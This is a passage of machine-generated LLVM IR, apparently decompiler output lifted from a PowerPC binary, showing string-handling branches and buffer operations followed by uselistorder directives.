  %v2_10001a78 = icmp sgt i32 %v2_10001a74, 0
  %v3_10001a78 = icmp eq i32 %v2_10001a74, 0
  store i1 %v1_10001a78, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001a78, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001a78, i1* %cr7_eq.global-to-local, align 1
  %tmp89 = icmp slt i32 %v2_10001a74, 1
  br i1 %tmp89, label %dec_label_pc_10001a9c, label %dec_label_pc_10001a80

dec_label_pc_10001a80:                            ; preds = %dec_label_pc_10001a70
  %v0_10001a80 = load i32, i32* @r31, align 4
  store i32 %v0_10001a80, i32* %r3.global-to-local, align 4
  store i32 268442248, i32* @lr, align 4
  %v1_10001a84 = inttoptr i32 %v0_10001a80 to i8*
  %v2_10001a84 = call i32 @function_100074dc(i8* %v1_10001a84)
  store i32 %v2_10001a84, i32* %r3.global-to-local, align 4
  %v1_10001a88 = icmp slt i32 %v2_10001a84, 127
  %v2_10001a88 = icmp sgt i32 %v2_10001a84, 127
  %v3_10001a88 = icmp eq i32 %v2_10001a84, 127
  store i1 %v1_10001a88, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001a88, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001a88, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001a88, label %dec_label_pc_10001a9c, label %dec_label_pc_10001a90

dec_label_pc_10001a90:                            ; preds = %dec_label_pc_10001a80
  %v0_10001a90 = load i32, i32* %r23.global-to-local, align 4
  %v1_10001a90 = add i32 %v0_10001a90, 789
  store i32 %v1_10001a90, i32* @r3, align 4
  %v0_10001a94 = load i32, i32* @r31, align 4
  store i32 %v0_10001a94, i32* %r4.global-to-local, align 4
  store i32 268442268, i32* %lr.global-to-local, align 4
  %v2_10001a98 = inttoptr i32 %v1_10001a90 to i8*
  %v3_10001a98 = call i32 @function_10007504(i8* %v2_10001a98, i32 %v0_10001a94)
  store i32 %v3_10001a98, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001a9c

dec_label_pc_10001a9c:                            ; preds = %dec_label_pc_10001a80, %dec_label_pc_10001a70, %dec_label_pc_1000174c, %dec_label_pc_10001a90
  %v0_10001a9c = load i32, i32* @r1, align 4
  %v1_10001a9c = add i32 %v0_10001a9c, 8
  %v2_10001a9c = inttoptr i32 %v1_10001a9c to i32*
  %v3_10001a9c = load i32, i32* %v2_10001a9c, align 4
  %v0_10001aa0 = load i32, i32* @r31, align 4
  %v2_10001aa0 = add i32 %v3_10001a9c, 1
  %v1_10001aa4 = add i32 %v2_10001aa0, %v0_10001aa0
  store i32 %v1_10001aa4, i32* %r3.global-to-local, align 4
  store i32 268442284, i32* @lr, align 4
  %v1_10001aa8 = inttoptr i32 %v1_10001aa4 to i8*
  %v2_10001aa8 = call i32 @function_100074dc(i8* %v1_10001aa8)
  store i32 %v2_10001aa8, i32* %r3.global-to-local, align 4
  %v1_10001aac = icmp slt i32 %v2_10001aa8, 255
  %v2_10001aac = icmp sgt i32 %v2_10001aa8, 255
  %v3_10001aac = icmp eq i32 %v2_10001aa8, 255
  store i1 %v1_10001aac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001aac, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001aac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001aac, label %dec_label_pc_10001758, label %dec_label_pc_10001ab4

dec_label_pc_10001ab4:                            ; preds = %dec_label_pc_10001a9c
  %v0_10001ab4 = load i32, i32* @r30, align 4
  store i32 %v0_10001ab4, i32* @r3, align 4
  store i32 255, i32* @r4, align 4
  store i32 268442304, i32* @lr, align 4
  %v0_10001abc = call i32 @function_10007584()
  store i32 %v0_10001abc, i32* %r3.global-to-local, align 4
  %v0_10001ac0 = load i32, i32* @r1, align 4
  %v1_10001ac0 = add i32 %v0_10001ac0, 8
  %v2_10001ac0 = inttoptr i32 %v1_10001ac0 to i32*
  %v3_10001ac0 = load i32, i32* %v2_10001ac0, align 4
  %v0_10001ac4 = load i32, i32* @r31, align 4
  %v2_10001ac4 = add i32 %v3_10001ac0, 1
  %v1_10001ac8 = add i32 %v2_10001ac4, %v0_10001ac4
  store i32 %v1_10001ac8, i32* %r3.global-to-local, align 4
  store i32 268442320, i32* @lr, align 4
  %v1_10001acc = inttoptr i32 %v1_10001ac8 to i8*
  %v2_10001acc = call i32 @function_100074dc(i8* %v1_10001acc)
  store i32 %v2_10001acc, i32* %r3.global-to-local, align 4
  %v1_10001ad0 = icmp slt i32 %v2_10001acc, 0
  %v2_10001ad0 = icmp sgt i32 %v2_10001acc, 0
  %v3_10001ad0 = icmp eq i32 %v2_10001acc, 0
  store i1 %v1_10001ad0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001ad0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001ad0, i1* %cr7_eq.global-to-local, align 1
  %tmp90 = icmp slt i32 %v2_10001acc, 1
  br i1 %tmp90, label %dec_label_pc_10001758, label %dec_label_pc_10001ad8

dec_label_pc_10001ad8:                            ; preds = %dec_label_pc_10001ab4
  %v0_10001ad8 = load i32, i32* @r1, align 4
  %v1_10001ad8 = add i32 %v0_10001ad8, 8
  %v2_10001ad8 = inttoptr i32 %v1_10001ad8 to i32*
  %v3_10001ad8 = load i32, i32* %v2_10001ad8, align 4
  %v0_10001adc = load i32, i32* @r30, align 4
  store i32 %v0_10001adc, i32* @r3, align 4
  %v0_10001ae0 = load i32, i32* @r31, align 4
  %v2_10001ae0 = add i32 %v3_10001ad8, 1
  %v1_10001ae4 = add i32 %v2_10001ae0, %v0_10001ae0
  store i32 %v1_10001ae4, i32* %r4.global-to-local, align 4
  store i32 268442348, i32* %lr.global-to-local, align 4
  %v2_10001ae8 = inttoptr i32 %v0_10001adc to i8*
  %v3_10001ae8 = call i32 @function_10007504(i8* %v2_10001ae8, i32 %v1_10001ae4)
  store i32 %v3_10001ae8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001758

dec_label_pc_10001af0:                            ; preds = %dec_label_pc_10001720
  store i32 7, i32* %r11.global-to-local, align 4
  %v1_10001af4 = load i32, i32* @r1, align 4
  %v2_10001af4 = add i32 %v1_10001af4, 8
  %v3_10001af4 = inttoptr i32 %v2_10001af4 to i32*
  store i32 7, i32* %v3_10001af4, align 4
  %v0_10001af8 = load i32, i32* @r31, align 4
  %v1_10001af8 = add i32 %v0_10001af8, 4
  %v2_10001af8 = inttoptr i32 %v1_10001af8 to i8*
  %v3_10001af8 = load i8, i8* %v2_10001af8, align 1
  %v4_10001af8 = zext i8 %v3_10001af8 to i32
  store i32 %v4_10001af8, i32* %r0.global-to-local, align 4
  %v1_10001afc = icmp ult i8 %v3_10001af8, 115
  %v2_10001afc = icmp ugt i8 %v3_10001af8, 115
  %v3_10001afc = icmp eq i8 %v3_10001af8, 115
  store i1 %v1_10001afc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001afc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001afc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001afc, label %dec_label_pc_10001b04, label %dec_label_pc_10001b0c

dec_label_pc_10001b04:                            ; preds = %dec_label_pc_10001af0
  store i32 8, i32* %r11.global-to-local, align 4
  %v1_10001b08 = load i32, i32* @r1, align 4
  %v2_10001b08 = add i32 %v1_10001b08, 8
  %v3_10001b08 = inttoptr i32 %v2_10001b08 to i32*
  store i32 8, i32* %v3_10001b08, align 4
  %v0_10001b14.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10001b0c

dec_label_pc_10001b0c:                            ; preds = %dec_label_pc_10001af0, %dec_label_pc_10001b04
  %v0_10001b14 = phi i32 [ %v0_10001af8, %dec_label_pc_10001af0 ], [ %v0_10001b14.pre, %dec_label_pc_10001b04 ]
  %v0_10001b0c = load i32, i32* @r1, align 4
  %v1_10001b0c = add i32 %v0_10001b0c, 8
  %v2_10001b0c = inttoptr i32 %v1_10001b0c to i32*
  %v3_10001b0c = load i32, i32* %v2_10001b0c, align 4
  %v0_10001b10 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001b14, i32* %r3.global-to-local, align 4
  %v1_10001b10 = sub i32 1, %v3_10001b0c
  %v2_10001b18 = add i32 %v1_10001b10, %v0_10001b10
  %v2_10001b1c = add i32 %v3_10001b0c, %v0_10001b14
  store i32 %v2_10001b1c, i32* %r4.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10001b24.49 to i32), i32* @lr, align 4
  %v3_10001b20 = call i32 @function_10008564(i32 %v0_10001b14, i32 %v2_10001b1c, i32 %v2_10001b18)
  store i32 %v3_10001b20, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_10001b28 = load i32, i32* @r1, align 4
  %v2_10001b28 = add i32 %v1_10001b28, 8
  %v3_10001b28 = inttoptr i32 %v2_10001b28 to i32*
  store i32 0, i32* %v3_10001b28, align 4
  %v0_10001b2c = load i32, i32* @r28, align 4
  %v1_10001b2c = load i32, i32* %r29.global-to-local, align 4
  %v2_10001b2c = add i32 %v1_10001b2c, %v0_10001b2c
  %v3_10001b2c = inttoptr i32 %v2_10001b2c to i8*
  %v4_10001b2c = load i8, i8* %v3_10001b2c, align 1
  %v5_10001b2c = zext i8 %v4_10001b2c to i32
  store i32 %v5_10001b2c, i32* %r3.global-to-local, align 4
  %v2_10001b30 = icmp ne i8 %v4_10001b2c, 0
  %v3_10001b30 = icmp eq i8 %v4_10001b2c, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001b30, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001b30, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001b30, label %dec_label_pc_10001a70, label %dec_label_pc_10001b38

dec_label_pc_10001b38:                            ; preds = %dec_label_pc_10001b0c
  %v1_10001b38 = icmp ult i8 %v4_10001b2c, 47
  %v2_10001b38 = icmp ugt i8 %v4_10001b2c, 47
  %v3_10001b38 = icmp eq i8 %v4_10001b2c, 47
  store i1 %v1_10001b38, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001b38, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001b38, i1* %cr7_eq.global-to-local, align 1
  %v0_10001b3c = load i32, i32* @r31, align 4
  store i32 %v0_10001b3c, i32* %r11.global-to-local, align 4
  br i1 %v3_10001b38, label %dec_label_pc_10001a68, label %dec_label_pc_10001b44

dec_label_pc_10001b44:                            ; preds = %dec_label_pc_10001b38
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10001b58

dec_label_pc_10001b4c:                            ; preds = %dec_label_pc_10001b58
  %v1_10001b4c = icmp ult i8 %v4_10001b60, 47
  %v2_10001b4c = icmp ugt i8 %v4_10001b60, 47
  %v3_10001b4c = icmp eq i8 %v4_10001b60, 47
  store i1 %v1_10001b4c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001b4c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001b4c, i1* %cr7_eq.global-to-local, align 1
  %v1_10001b50 = add i32 %v1_10001b5c, 1
  store i32 %v1_10001b50, i32* %r9.global-to-local, align 4
  br i1 %v3_10001b4c, label %dec_label_pc_10001a68, label %dec_label_pc_10001b58

dec_label_pc_10001b58:                            ; preds = %dec_label_pc_10001b4c, %dec_label_pc_10001b44
  %v0_10001b58 = phi i32 [ %v1_10001b50, %dec_label_pc_10001b4c ], [ 1, %dec_label_pc_10001b44 ]
  %v1_10001b58 = load i32, i32* @r1, align 4
  %v2_10001b58 = add i32 %v1_10001b58, 8
  %v3_10001b58 = inttoptr i32 %v2_10001b58 to i32*
  store i32 %v0_10001b58, i32* %v3_10001b58, align 4
  %v0_10001b5c = load i32, i32* @r31, align 4
  %v1_10001b5c = load i32, i32* %r9.global-to-local, align 4
  %v2_10001b5c = add i32 %v1_10001b5c, %v0_10001b5c
  store i32 %v2_10001b5c, i32* %r11.global-to-local, align 4
  %v3_10001b60 = inttoptr i32 %v2_10001b5c to i8*
  %v4_10001b60 = load i8, i8* %v3_10001b60, align 1
  %v5_10001b60 = zext i8 %v4_10001b60 to i32
  store i32 %v5_10001b60, i32* %r0.global-to-local, align 4
  %v2_10001b64 = icmp ne i8 %v4_10001b60, 0
  %v3_10001b64 = icmp eq i8 %v4_10001b60, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001b64, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001b64, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001b64, label %dec_label_pc_10001a70, label %dec_label_pc_10001b4c

dec_label_pc_10001b70:                            ; preds = %dec_label_pc_100014d0
  %v0_10001b70 = load i32, i32* %r29.global-to-local, align 4
  %v1_10001b70 = trunc i32 %v0_10001b70 to i8
  %v2_10001b70 = load i32, i32* @r30, align 4
  %v3_10001b70 = add i32 %v2_10001b70, -529
  %v4_10001b70 = inttoptr i32 %v3_10001b70 to i8*
  store i8 %v1_10001b70, i8* %v4_10001b70, align 1
  br label %dec_label_pc_10000824

dec_label_pc_10001b78:                            ; preds = %dec_label_pc_10001934
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10001b7c = load i32, i32* @r30, align 4
  %v3_10001b7c = add i32 %v2_10001b7c, -529
  %v4_10001b7c = inttoptr i32 %v3_10001b7c to i8*
  store i8 1, i8* %v4_10001b7c, align 1
  br label %dec_label_pc_100017bc

dec_label_pc_10001b84:                            ; preds = %dec_label_pc_10001660
  %v1_10001b84 = add i32 %v1_10001674, 1
  store i32 %v1_10001b84, i32* %r11.global-to-local, align 4
  %v1_10001b88 = load i32, i32* @r1, align 4
  %v2_10001b88 = add i32 %v1_10001b88, 8
  %v3_10001b88 = inttoptr i32 %v2_10001b88 to i32*
  store i32 %v1_10001b84, i32* %v3_10001b88, align 4
  %v0_10001680.pre = load i32, i32* @r28, align 4
  %v1_10001680.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10001680

dec_label_pc_10001b90:                            ; preds = %dec_label_pc_10001948
  %v0_10001b90 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10001b90, i32* %r3.global-to-local, align 4
  store i32 268442520, i32* @lr, align 4
  %v1_10001b94 = inttoptr i32 %v0_10001b90 to i8*
  %v2_10001b94 = call i32 @function_100074dc(i8* %v1_10001b94)
  store i32 %v2_10001b94, i32* %r3.global-to-local, align 4
  %v1_10001b98 = icmp slt i32 %v2_10001b94, 127
  %v2_10001b98 = icmp sgt i32 %v2_10001b94, 127
  %v3_10001b98 = icmp eq i32 %v2_10001b94, 127
  store i1 %v1_10001b98, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10001b98, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10001b98, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001b98, label %dec_label_pc_100019ac, label %dec_label_pc_10001ba0

dec_label_pc_10001ba0:                            ; preds = %dec_label_pc_10001b90
  %v0_10001ba0 = load i32, i32* @r30, align 4
  %v1_10001ba0 = add i32 %v0_10001ba0, 935
  %v2_10001ba0 = inttoptr i32 %v1_10001ba0 to i32*
  %v3_10001ba0 = load i32, i32* %v2_10001ba0, align 4
  store i32 %v3_10001ba0, i32* %r3.global-to-local, align 4
  %v0_10001ba4 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10001ba4, i32* %r4.global-to-local, align 4
  %v0_10001ba8 = load i32, i32* @r1, align 4
  %v1_10001ba8 = add i32 %v0_10001ba8, 20808
  %v2_10001ba8 = inttoptr i32 %v1_10001ba8 to i32*
  %v3_10001ba8 = load i32, i32* %v2_10001ba8, align 4
  store i32 %v3_10001ba8, i32* %r0.global-to-local, align 4
  %v0_10001bac = load i32, i32* %r28.global-to-local, align 4
  %v1_10001bac = add i32 %v0_10001bac, 3
  store i32 %v1_10001bac, i32* %r28.global-to-local, align 4
  %v1_10001bb0 = mul i32 %v3_10001ba0, 128
  %v0_10001bb4 = load i32, i32* %r27.global-to-local, align 4
  %v2_10001bb4 = add i32 %v0_10001bb4, %v1_10001bac
  store i32 %v2_10001bb4, i32* %r27.global-to-local, align 4
  %v2_10001bb8 = add i32 %v3_10001ba8, %v1_10001bb0
  store i32 %v2_10001bb8, i32* @r3, align 4
  store i32 268442560, i32* %lr.global-to-local, align 4
  %v2_10001bbc = inttoptr i32 %v2_10001bb8 to i8*
  %v3_10001bbc = call i32 @function_10007504(i8* %v2_10001bbc, i32 %v0_10001ba4)
  store i32 %v3_10001bbc, i32* %r3.global-to-local, align 4
  %v0_10001bc0 = load i32, i32* @r30, align 4
  %v1_10001bc0 = add i32 %v0_10001bc0, 935
  %v2_10001bc0 = inttoptr i32 %v1_10001bc0 to i32*
  %v3_10001bc0 = load i32, i32* %v2_10001bc0, align 4
  store i32 %v3_10001bc0, i32* %r29.global-to-local, align 4
  %v0_10001bc4 = load i32, i32* @r1, align 4
  %v1_10001bc4 = add i32 %v0_10001bc4, 20808
  %v2_10001bc4 = inttoptr i32 %v1_10001bc4 to i32*
  %v3_10001bc4 = load i32, i32* %v2_10001bc4, align 4
  store i32 %v3_10001bc4, i32* %r0.global-to-local, align 4
  %v1_10001bc8 = mul i32 %v3_10001bc0, 128
  %v2_10001bcc = add i32 %v3_10001bc4, %v1_10001bc8
  store i32 %v2_10001bcc, i32* %r29.global-to-local, align 4
  store i32 %v2_10001bcc, i32* %r3.global-to-local, align 4
  store i32 268442584, i32* @lr, align 4
  %v1_10001bd4 = inttoptr i32 %v2_10001bcc to i8*
  %v2_10001bd4 = call i32 @function_100074dc(i8* %v1_10001bd4)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a7f8.50 to i32), i32* %r4.global-to-local, align 4
  %v0_10001be0 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001be0 = add i32 %v0_10001be0, %v2_10001bd4
  store i32 %v2_10001be0, i32* @r3, align 4
  store i32 268442600, i32* %lr.global-to-local, align 4
  %v2_10001be4 = inttoptr i32 %v2_10001be0 to i8*
  %v3_10001be4 = call i32 @function_10007504(i8* %v2_10001be4, i32 ptrtoint (i32* @global_var_1000a7f8.50 to i32))
  store i32 %v3_10001be4, i32* %r3.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001bec = load i32, i32* @r30, align 4
  %v1_10001bec = add i32 %v0_10001bec, 1579
  %v2_10001bec = inttoptr i32 %v1_10001bec to i32*
  %v3_10001bec = load i32, i32* %v2_10001bec, align 4
  %v0_10001bf8 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001bf8, i32* %r3.global-to-local, align 4
  %v0_10001bfc = load i32, i32* %r28.global-to-local, align 4
  %v2_10001bfc = sub i32 %v3_10001bec, %v0_10001bfc
  store i32 %v2_10001bfc, i32* %r4.global-to-local, align 4
  %v1_10001c00 = load i32, i32* %r23.global-to-local, align 4
  %v2_10001c00 = add i32 %v1_10001c00, %v0_10001bfc
  store i32 %v2_10001c00, i32* %r28.global-to-local, align 4
  store i32 268442632, i32* %lr.global-to-local, align 4
  %v4_10001c04 = call i32 @function_100075a8(i32 %v0_10001bf8, i32 %v2_10001bfc, i32 ptrtoint (i32* @global_var_1000a7f4.47 to i32), i32 1)
  store i32 %v4_10001c04, i32* %r3.global-to-local, align 4
  %v0_10001c08 = load i32, i32* @r30, align 4
  %v1_10001c08 = add i32 %v0_10001c08, 935
  %v2_10001c08 = inttoptr i32 %v1_10001c08 to i32*
  %v3_10001c08 = load i32, i32* %v2_10001c08, align 4
  store i32 %v3_10001c08, i32* %r29.global-to-local, align 4
  %v0_10001c0c = load i32, i32* @r1, align 4
  %v1_10001c0c = add i32 %v0_10001c0c, 20808
  %v2_10001c0c = inttoptr i32 %v1_10001c0c to i32*
  %v3_10001c0c = load i32, i32* %v2_10001c0c, align 4
  store i32 %v3_10001c0c, i32* %r0.global-to-local, align 4
  %v0_10001c10 = load i32, i32* %r28.global-to-local, align 4
  %v2_10001c10 = add i32 %v0_10001c10, %v4_10001c04
  %v1_10001c14 = mul i32 %v3_10001c08, 128
  %v1_10001c18 = add i32 %v2_10001c10, 2111
  store i32 %v1_10001c18, i32* %r28.global-to-local, align 4
  %v2_10001c1c = add i32 %v3_10001c0c, %v1_10001c14
  store i32 %v2_10001c1c, i32* %r29.global-to-local, align 4
  %v0_10001c20 = load i32, i32* %r26.global-to-local, align 4
  %v1_10001c20 = trunc i32 %v0_10001c20 to i8
  %v3_10001c20 = add i32 %v2_10001c10, 2115
  %v4_10001c20 = inttoptr i32 %v3_10001c20 to i8*
  store i8 %v1_10001c20, i8* %v4_10001c20, align 1
  %v0_10001c24 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001c24, i32* %r3.global-to-local, align 4
  store i32 268442668, i32* @lr, align 4
  %v1_10001c28 = inttoptr i32 %v0_10001c24 to i8*
  %v2_10001c28 = call i32 @function_100074dc(i8* %v1_10001c28)
  %v0_10001c2c = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001c2c, i32* %r4.global-to-local, align 4
  %v0_10001c30 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001c30 = add i32 %v0_10001c30, %v2_10001c28
  store i32 %v2_10001c30, i32* @r3, align 4
  store i32 268442680, i32* %lr.global-to-local, align 4
  %v2_10001c34 = inttoptr i32 %v2_10001c30 to i8*
  %v3_10001c34 = call i32 @function_10007504(i8* %v2_10001c34, i32 %v0_10001c2c)
  store i32 %v3_10001c34, i32* %r3.global-to-local, align 4
  %v0_10001c38 = load i32, i32* @r30, align 4
  %v1_10001c38 = add i32 %v0_10001c38, 935
  %v2_10001c38 = inttoptr i32 %v1_10001c38 to i32*
  %v3_10001c38 = load i32, i32* %v2_10001c38, align 4
  %v1_10001c3c = add i32 %v3_10001c38, 1
  store i32 %v1_10001c3c, i32* %r9.global-to-local, align 4
  store i32 %v1_10001c3c, i32* %v2_10001c38, align 4
  br label %dec_label_pc_100019ac

dec_label_pc_10001c70:                            ; preds = %dec_label_pc_10000578
  %v0_10001c70 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10001c70, i32* @r3, align 4
  %v0_10001c74 = load i32, i32* %r28.global-to-local, align 4
  %v1_10001c74 = add i32 %v0_10001c74, 1
  store i32 %v1_10001c74, i32* %r28.global-to-local, align 4
  %v0_10001c78 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10001c78, i32* %r4.global-to-local, align 4
  %v0_10001c7c = load i32, i32* @r31, align 4
  %v1_10001c7c = add i32 %v0_10001c7c, 3140
  store i32 %v1_10001c7c, i32* @r31, align 4
  store i32 268442756, i32* %lr.global-to-local, align 4
  %v2_10001c80 = inttoptr i32 %v0_10001c70 to i8*
  %v3_10001c80 = call i32 @function_10007504(i8* %v2_10001c80, i32 %v0_10001c78)
  store i32 %v3_10001c80, i32* %r3.global-to-local, align 4
  %v0_10001c84 = load i32, i32* %r21.global-to-local, align 4
  %v1_10001c84 = load i32, i32* %r28.global-to-local, align 4
  %v2_10001c84 = icmp slt i32 %v0_10001c84, %v1_10001c84
  %v3_10001c84 = icmp sgt i32 %v0_10001c84, %v1_10001c84
  %v4_10001c84 = icmp eq i32 %v0_10001c84, %v1_10001c84
  store i1 %v2_10001c84, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001c84, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10001c84, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10001c84, label %dec_label_pc_10001c8c, label %dec_label_pc_10001c70.dec_label_pc_100004c8_crit_edge

dec_label_pc_10001c70.dec_label_pc_100004c8_crit_edge: ; preds = %dec_label_pc_10001c70
  %v2_100004d4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100004c8

dec_label_pc_10001c8c:                            ; preds = %dec_label_pc_10001c70
  %v0_10001c8c = load i32, i32* @r1, align 4
  %v1_10001c8c = add i32 %v0_10001c8c, 20804
  %v2_10001c8c = inttoptr i32 %v1_10001c8c to i32*
  %v3_10001c8c = load i32, i32* %v2_10001c8c, align 4
  store i32 %v3_10001c8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100005c4.preheader

; uselistorder directives
  uselistorder i32 %v3_10001c8c, { 1, 0 }
  uselistorder i32 %v0_10001c8c, { 1, 0 }
  uselistorder i32 %v1_10001c84, { 1, 2, 3, 0 }
  uselistorder i32 %v2_10001b94, { 2, 1, 0, 3 }
  uselistorder i8 %v4_10001b60, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v2_10001b5c, { 1, 2, 0 }
  uselistorder i1 %v3_10001b4c, { 1, 0 }
  uselistorder i32 %v0_10001b3c, { 1, 0 }
  uselistorder i1 %v3_10001b38, { 1, 0 }
  uselistorder i32 %v3_10001b0c, { 1, 0 }
  uselistorder i32 %v0_10001b14, { 2, 0, 1 }
  uselistorder i32 %v2_10001acc, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v2_10001aa8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001a84, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001a74, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v2_10001a4c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001a34, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_100019dc, { 1, 0, 2 }
  uselistorder i32 %v0_100019d0, { 1, 0 }
  uselistorder i32 %v3_10001994, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001978, { 1, 0, 2 }
  uselistorder i32 %v4_1000196c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10001928, { 2, 1, 0, 3 }
  uselistorder i32 %v2_100018cc, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v2_100018a8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001884, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001874, { 0, 3, 2, 1, 4 }
  uselistorder i8 %v4_10001864, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_1000185c, { 0, 2, 1 }
  uselistorder i1 %v3_1000184c, { 1, 0 }
  uselistorder i1 %v3_10001838, { 1, 0 }
  uselistorder i32 %v0_10001814, { 2, 0, 1 }
  uselistorder i32 %v2_100017ec, { 2, 1, 0, 3 }
  uselistorder i32 %v4_100017a8, { 2, 1, 0, 3 }
  uselistorder i32 %v5_10001740, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10001714, { 2, 1, 0, 3 }
  uselistorder i32 %v1_100016f0, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_100016d8, { 1, 0 }
  uselistorder i32 %v0_100016d8, { 1, 0 }
  uselistorder i32 %v3_100019cc, { 2, 0, 3, 1 }
  uselistorder i32 %v5_100016a0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10001674, { 2, 1, 0 }
  uselistorder i32 %v0_10001674, { 1, 0 }
  uselistorder i32 %v0_10001658, { 1, 0 }
  uselistorder i32 %v1_10001648, { 4, 1, 2, 3, 0 }
  uselistorder i32 %v0_1000163c, { 0, 2, 1 }
  uselistorder i32 %v1_10001624, { 1, 2, 3, 0 }
  uselistorder i32 %v5_100015e4, { 0, 5, 4, 3, 2, 1, 6, 9, 8, 7, 10 }
  uselistorder i32 %v3_100015d0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1000158c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1000154c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10001538, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_100014a8, { 2, 1, 0, 3 }
  uselistorder i32 %v5_10001488, { 1, 0 }
  uselistorder i32 %v5_1000146c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10001454, { 1, 0 }
  uselistorder i32 %v4_10001448, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10001400, { 1, 2, 0 }
  uselistorder i32 %v0_100013d0, { 1, 0 }
  uselistorder i32 %v3_100013bc, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1000139c, { 6, 5, 4, 7, 3, 0, 2, 1 }
  uselistorder i32* %v2_1000139c, { 1, 0 }
  uselistorder i32 %v0_1000139c, { 1, 0 }
  uselistorder i32 %v3_10001388, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_10001370, { 1, 2, 0 }
  uselistorder i32 %v0_10001364, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_10001354, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_1000145c, { 0, 2, 1 }
  uselistorder i32 %v3_10001344, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1000133c, { 2, 1, 0 }
  uselistorder i32 %v1_10001308, { 0, 3, 2, 1 }
  uselistorder i32 %v3_100012a4, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1000125c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1000124c, { 0, 2, 1 }
  uselistorder i32 %v4_1000123c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10001214, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v3_10001210, { 2, 1, 0, 3 }
  uselistorder i32 %v5_100011cc, { 2, 1, 0, 3 }
  uselistorder i32 %v1_100011ac, { 1, 0 }
  uselistorder i32 %v5_1000118c, { 0, 1, 5, 4, 3, 2, 8, 7, 6, 9 }
  uselistorder i32 %v3_10001178, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10001134, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10001110, { 2, 1, 0, 3 }
  uselistorder i1 %v3_100010c0, { 0, 2, 1 }
  uselistorder i32 %v3_100010d8, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %v2_100010d8, { 0, 2, 1 }
